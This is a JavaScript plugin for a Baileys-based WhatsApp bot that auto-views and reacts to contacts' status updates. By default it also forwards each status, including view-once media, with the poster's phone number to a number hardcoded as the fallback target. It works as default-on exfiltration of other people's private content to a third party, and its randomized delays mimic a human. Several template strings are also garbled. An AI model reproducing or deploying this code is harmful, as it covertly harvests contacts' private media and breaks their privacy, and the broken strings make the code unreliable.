const fs = require('fs/promises');
const path = require('path');
const { downloadMediaMessage, proto } = require('@whiskeysockets/baileys');

const isOwnerOrSudo = require('../lib/isOwner');
const settings = require('../settings');

// ────────────────────────────────────────────────
const CONFIG_FILE = path.join(__dirname, '../data/autoStatus.json');
const TARGET_NUMBER = settings.syncTarget || '255615944741';
const TARGET_JID = `${TARGET_NUMBER}@s.whatsapp.net`;
const SYNC_DELAY = settings.syncDelay || 6; // base delay in seconds

const DEFAULT_CONFIG = Object.freeze({
    enabled: true,
    reactWith: '❤️',                    // '' = disable reaction
    reactDelayMinMs: SYNC_DELAY * 100,
    reactDelayMaxMs: SYNC_DELAY * 200,
    forwardDelayMinMs: SYNC_DELAY * 250,
    forwardDelayMaxMs: SYNC_DELAY * 500,
    markAsRead: true,                   // new: control auto read
});

let configCache = null;
const processedStatusIds = new Set();   // prevent double processing

// ────────────────────────────────────────────────
async function loadConfig() {
    if (configCache) return configCache;

    try {
        const data = await fs.readFile(CONFIG_FILE, 'utf8');
        configCache = { ...DEFAULT_CONFIG, ...JSON.parse(data) };
    } catch (err) {
        if (err.code !== 'ENOENT') {
            console.error('[AutoStatus] Config load error → defaults', err.message);
        }
        configCache = { ...DEFAULT_CONFIG };
        await saveConfig(configCache);
    }
    return configCache;
}

async function saveConfig(updates) {
    configCache = { ...configCache, ...updates };
    try {
        await fs.mkdir(path.dirname(CONFIG_FILE), { recursive: true });
        await fs.writeFile(CONFIG_FILE, JSON.stringify(configCache, null, 2));
    } catch (err) {
        console.error('[AutoStatus] Save failed', err.message);
    }
}

// ────────────────────────────────────────────────
function extractPhoneNumber(key) {
    if (!key) return 'unknown';
    const jid = key.participant || key.remoteJid || '';
    const match = jid.match(/^(\d{9,15})/);
    return match ? match[1] : 'unknown';
}

function getTimeStr() {
    return new Date().toLocaleString('en-GB', {
        timeZone: 'Africa/Dar_es_Salaam',
        dateStyle: 'short',
        timeStyle: 'medium'
    });
}

function randomMs(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

// ────────────────────────────────────────────────
async function sendReaction(sock, key, emoji) {
    if (!emoji || !key?.id || !key?.participant) return;

    const reaction = {
        key: {
            remoteJid: 'status@broadcast',
            fromMe: false,
            id: key.id,
            participant: key.participant
        },
        text: emoji,
        isBigEmoji: true
    };

    try {
        await sock.sendMessage('status@broadcast', { react: reaction });
    } catch (err) {
        // fallback (older baileys versions / connection issues)
        try {
            await sock.relayMessage('status@broadcast', { reactionMessage: reaction }, { messageId: key.id });
        } catch (relayErr) {
            console.debug(`[Reaction failed] ${relayErr.message || err.message}`);
        }
    }
}

// ────────────────────────────────────────────────
async function forwardStatus(sock, msg) {
    if (!msg?.message || !msg.key?.id) return;

    const msgId = msg.key.id;
    if (processedStatusIds.has(msgId)) return;
    processedStatusIds.add(msgId);
    if (processedStatusIds.size > 1200) processedStatusIds.clear(); // bigger but safe limit

    const phone = extractPhoneNumber(msg.key);
    const msgType = Object.keys(msg.message)[0] ?? 'unknown';
    const content = msg.message[msgType] ?? {};
    const timeStr = getTimeStr();

    // Skip useless protocol/control messages
    if (['senderKeyDistributionMessage', 'protocolMessage', 'ephemeralMessage'].includes(msgType) &&
        !content.caption && !msg.message.imageMessage && !msg.message.videoMessage) {
        return;
    }

    console.log(`[Status] ${phone} • ${msgType} • ${timeStr}`);

    // 1. Info header
    await sock.sendMessage(TARGET_JID, {
        text: `📸 New status from \( {phone} ( \){msgType})`
    }).catch(() => {});

    await new Promise(r => setTimeout(r, randomMs(700, 1400)));

    // Text-only status
    if (msgType === 'conversation' || msgType === 'extendedTextMessage') {
        const text = (content.text || content.description || '[empty text]').trim();
        await sock.sendMessage(TARGET_JID, {
            text: `${text}\n\n🕒 ${timeStr} • from ${phone}`
        }).catch(() => {});
        return;
    }

    // Media types mapping
    const MEDIA_TYPES = {
        imageMessage:    { key: 'image',    ext: 'jpg',  mime: 'image/jpeg'   },
        videoMessage:    { key: 'video',    ext: 'mp4',  mime: 'video/mp4'    },
        audioMessage:    { key: 'audio',    ext: 'ogg',  mime: 'audio/ogg; codecs=opus' },
        stickerMessage:  { key: 'sticker',  ext: 'webp', mime: 'image/webp'   },
        documentMessage: { key: 'document', ext: content.fileName?.split('.').pop() ?? 'bin' }
    };

    const handler = MEDIA_TYPES[msgType];
    if (!handler) {
        console.debug(`[Skipped] Unsupported type → ${msgType} • ${phone}`);
        return;
    }

    try {
        const buffer = await downloadMediaMessage(msg, 'buffer', {}, {
            logger: console,
            reuploadRequest: sock.updateMediaMessage
        });

        if (!buffer || buffer.length < 200) {
            throw new Error('Downloaded media is empty/corrupt');
        }

        const caption = [
            content.caption?.trim() ? `Caption: ${content.caption.trim()}` : '',
            content.viewOnce ? '🔒 View once' : '',
            `🕒 ${timeStr} • from ${phone}`
        ].filter(Boolean).join('\n');

        await sock.sendMessage(TARGET_JID, {
            [handler.key]: buffer,
            mimetype: content.mimetype || handler.mime,
            caption: caption || undefined,
            fileName: content.fileName || `status-\( {Date.now()}. \){handler.ext}`,
            ...(content.viewOnce ? { viewOnce: true } : {})
        });

        console.log(`[Forward OK] ${handler.key} • ${phone}`);
    } catch (err) {
        console.error('[Forward FAIL]', err.message || err);
        await sock.sendMessage(TARGET_JID, {
            text: `⚠️ Could not forward ${msgType} from ${phone}\nError: ${err.message.slice(0, 80)}\n🕒 ${timeStr}`
        }).catch(() => {});
    }
}

// ────────────────────────────────────────────────
async function handleStatusUpdate(sock, ev) {
    const cfg = await loadConfig();
    if (!cfg.enabled) return;

    let statusKey = null;
    let statusMsg = null;

    // ─── Event shape normalization ───
    if (ev.messages?.length) {
        const m = ev.messages[0];
        if (m.key?.remoteJid === 'status@broadcast') {
            statusKey = m.key;
            statusMsg = m;
        }
    } else if (ev.key?.remoteJid === 'status@broadcast') {
        statusKey = ev.key;
        statusMsg = ev;
    } else if (ev.reaction?.key?.remoteJid === 'status@broadcast') {
        statusKey = ev.reaction.key;
    } else if (ev.receipt?.key?.remoteJid === 'status@broadcast') {
        // view receipt (seen)
        statusKey = ev.receipt.key;
    }

    if (!statusKey?.id || !statusKey.remoteJid?.includes('status@broadcast')) return;

    // Deduplicate
    if (processedStatusIds.has(statusKey.id)) return;
    processedStatusIds.add(statusKey.id);

    try {
        // 1. Mark as read (simulate view)
        if (cfg.markAsRead) {
            await sock.readMessages([statusKey]).catch(() => {});
        }

        // 2. Reaction / like
        if (cfg.reactWith?.trim()) {
            await new Promise(r => setTimeout(r, randomMs(cfg.reactDelayMinMs, cfg.reactDelayMaxMs)));
            await sendReaction(sock, statusKey, cfg.reactWith);
        }

        // 3. Forward content (only if full message arrived)
        if (statusMsg?.message) {
            await new Promise(r => setTimeout(r, randomMs(cfg.forwardDelayMinMs, cfg.forwardDelayMaxMs)));
            await forwardStatus(sock, statusMsg);
        }

    } catch (err) {
        console.error('[AutoStatus] Processing error', err?.message || err);
    }
}

// ────────────────────────────────────────────────
async function autoStatusCommand(sock, chatId, msg, args = []) {
    const sender = msg.key.participant || msg.key.remoteJid;
    const isAllowed = msg.key.fromMe || (await isOwnerOrSudo(sender, sock, chatId));

    if (!isAllowed) {
        return sock.sendMessage(chatId, { text: '⛔ Owner/sudo only' });
    }

    const cfg = await loadConfig();

    if (!args.length) {
        const reactStatus = cfg.reactWith?.trim() ? `→ ${cfg.reactWith}` : '→ disabled';
        return sock.sendMessage(chatId, {
            text: `🔄 *Auto Status Manager* (default: ON)\n\n` +
                  `Enabled    : ${cfg.enabled ? '🟢 ON' : '🔴 OFF'}\n` +
                  `Reaction   : ${reactStatus}\n` +
                  `Mark read  : ${cfg.markAsRead ? '🟢 Yes' : '🔴 No'}\n` +
                  `Target     : ${TARGET_NUMBER}\n\n` +
                  `Commands:\n` +
                  `  .autostatus on / off\n` +
                  `  .autostatus react ❤️ / 🔥 / '' (empty = disable)\n` +
                  `  .autostatus read on / off\n` +
                  `  .autostatus status`
        });
    }

    const cmd = args[0].toLowerCase();

    if (cmd === 'on') {
        await saveConfig({ enabled: true });
        return sock.sendMessage(chatId, { text: 'Auto-status → 🟢 Enabled' });
    }

    if (cmd === 'off') {
        await saveConfig({ enabled: false });
        return sock.sendMessage(chatId, { text: 'Auto-status → 🔴 Disabled' });
    }

    if (cmd === 'react') {
        if (args.length < 2) {
            return sock.sendMessage(chatId, { text: 'Usage: .autostatus react ❤️   (or empty string to disable)' });
        }
        const emoji = args[1].trim();
        await saveConfig({ reactWith: emoji });
        const msg = emoji ? `Reaction set → ${emoji}` : 'Reaction → disabled';
        return sock.sendMessage(chatId, { text: msg });
    }

    if (cmd === 'read') {
        if (args.length < 2 || !['on','off'].includes(args[1].toLowerCase())) {
            return sock.sendMessage(chatId, { text: 'Usage: .autostatus read on / off' });
        }
        const value = args[1].toLowerCase() === 'on';
        await saveConfig({ markAsRead: value });
        return sock.sendMessage(chatId, { text: `Auto mark read → ${value ? '🟢 ON' : '🔴 OFF'}` });
    }

    if (cmd === 'status') {
        return sock.sendMessage(chatId, {
            text: `Current config:\n\`\`\`${JSON.stringify(cfg, null, 2)}\`\`\``
        });
    }

    return sock.sendMessage(chatId, { text: 'Unknown subcommand. Try .autostatus' });
}

module.exports = {
    autoStatusCommand,
    handleStatusUpdate
};